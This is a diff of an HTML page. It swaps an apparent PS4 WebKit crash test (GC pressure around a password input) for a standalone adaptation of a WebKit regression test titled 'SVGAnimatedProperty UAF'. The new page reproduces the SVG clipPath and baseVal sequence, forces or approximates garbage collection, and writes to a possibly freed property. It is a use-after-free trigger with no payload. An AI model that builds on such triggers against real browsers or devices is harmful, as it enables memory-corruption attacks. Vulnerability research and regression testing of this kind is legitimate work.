@@ -1,50 +1,205 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>PS4 WebKit Test</title>
+<meta charset="UTF-8">
+<title>SVGAnimatedProperty UAF</title>
+</head>
+
+<body>
+
 <script>
 
-function gc() {
-    function gcRec(n) {
-          if (n < 1)
-              return {};
-          var temp = {i: "ab" + i + (i / 100000)};
-          temp += "foo";
-          gcRec(n-1);
+/*
+ * ============================================================
+ * Standalone adaptation
+ * ============================================================
+ *
+ * Original internal APIs:
+ *
+ *     internals.observeGC(...)
+ *     GCController.collect()
+ *
+ * These APIs are available in WebKit's LayoutTest environment,
+ * not in a normal browser page.
+ *
+ * The actual SVG/DOM sequence below is intentionally preserved.
+ */
+
+
+/*
+ * Best-effort GC pressure for environments without
+ * GCController.collect().
+ *
+ * This does NOT force a garbage collection and therefore cannot
+ * reproduce the determinism of the original LayoutTest.
+ */
+async function requestGCPressure()
+{
+    /*
+     * First give the engine an asynchronous checkpoint.
+     */
+    await Promise.resolve();
+
+    /*
+     * Temporary allocations intended only to create normal
+     * garbage and yield points.
+     */
+    var garbage = [];
+
+    for (var i = 0; i < 32; ++i) {
+        garbage.push(new Array(4096).fill(i));
     }
-    for (var i = 0; i < 10000; i++)
-    gcRec(10);
+
+    garbage = null;
+
+    await new Promise(function (resolve) {
+        setTimeout(resolve, 0);
+    });
+
+    await Promise.resolve();
 }
 
 
-function triggerBug() {
-    var input = document.getElementById("target_input");
-    if (!input) return;    
-    input.focus();
-   
-    setTimeout(function() {
-        input.type = "text";  
-     
-        gc();        
-        if (input.parentNode) {
-            input.parentNode.removeChild(input);
-        }
-        
-        gc();
-    }, 10);
-}
+/*
+ * ============================================================
+ * Original test
+ * ============================================================
+ */
 
-function startTest() {
-   
-    setTimeout(triggerBug, 500);
-}
+window.addEventListener("load", async function () {
+
+    /*
+     * Original:
+     *
+     * let svg0 = document.createElementNS(
+     *     'http://www.w3.org/2000/svg',
+     *     'svg'
+     * );
+     */
+    let svg0 = document.createElementNS(
+        "http://www.w3.org/2000/svg",
+        "svg"
+    );
+
+
+    /*
+     * Original:
+     *
+     * let svgAnimatedLength = svg0.width;
+     */
+    let svgAnimatedLength = svg0.width;
+
+
+    /*
+     * Original:
+     *
+     * let observation = internals.observeGC(svgAnimatedLength)
+     *
+     * This is intentionally not replaced with a fake observer.
+     *
+     * The original observation controls the GC test condition.
+     */
+    let observation = null;
+
+    if (window.internals &&
+        typeof window.internals.observeGC === "function") {
+
+        observation = internals.observeGC(svgAnimatedLength);
+    }
+
+
+    /*
+     * Original:
+     *
+     * let baseVal = svgAnimatedLength.baseVal;
+     */
+    let baseVal = svgAnimatedLength.baseVal;
+
+
+    /*
+     * Original:
+     *
+     * let clipPath0 =
+     *     document.createElementNS(
+     *         'http://www.w3.org/2000/svg',
+     *         'clipPath'
+     *     );
+     */
+    let clipPath0 = document.createElementNS(
+        "http://www.w3.org/2000/svg",
+        "clipPath"
+    );
+
+
+    /*
+     * Original:
+     *
+     * svg0.append(clipPath0);
+     */
+    svg0.append(clipPath0);
+
+
+    /*
+     * Original:
+     *
+     * clipPath0.append('');
+     */
+    clipPath0.append("");
+
+
+    /*
+     * The original uses:
+     *
+     * await undefined;
+     *
+     * Preserve that exact asynchronous boundary.
+     */
+    await undefined;
+
+
+    /*
+     * Original:
+     *
+     * GCController.collect();
+     *
+     * Keep the real internal collector when available.
+     */
+    if (typeof GCController !== "undefined" &&
+        typeof GCController.collect === "function") {
+
+        GCController.collect();
+
+    } else {
+
+        /*
+         * Standalone fallback.
+         *
+         * This cannot guarantee collection; it only creates
+         * garbage and another scheduling boundary.
+         */
+        await requestGCPressure();
+    }
+
+
+    /*
+     * Original critical operation:
+     *
+     * baseVal.value = 0;
+     *
+     * Do not replace this with setAttribute(), because this is
+     * specifically the SVGAnimatedProperty path being tested.
+     */
+    baseVal.value = 0;
+
+
+    /*
+     * Preserve the final DOM operation.
+     */
+    document.body.innerHTML = "PASS if no crash";
+
+});
+
 </script>
-</head>
-<body onload="startTest()">
-    <h2>Teste de Estabilidade WebKit (PS4)</h2>
-    <form>
-        <input id="target_input" type="password" name="password" autocomplete="current-password">
-    </form>
+
 </body>
 </html>
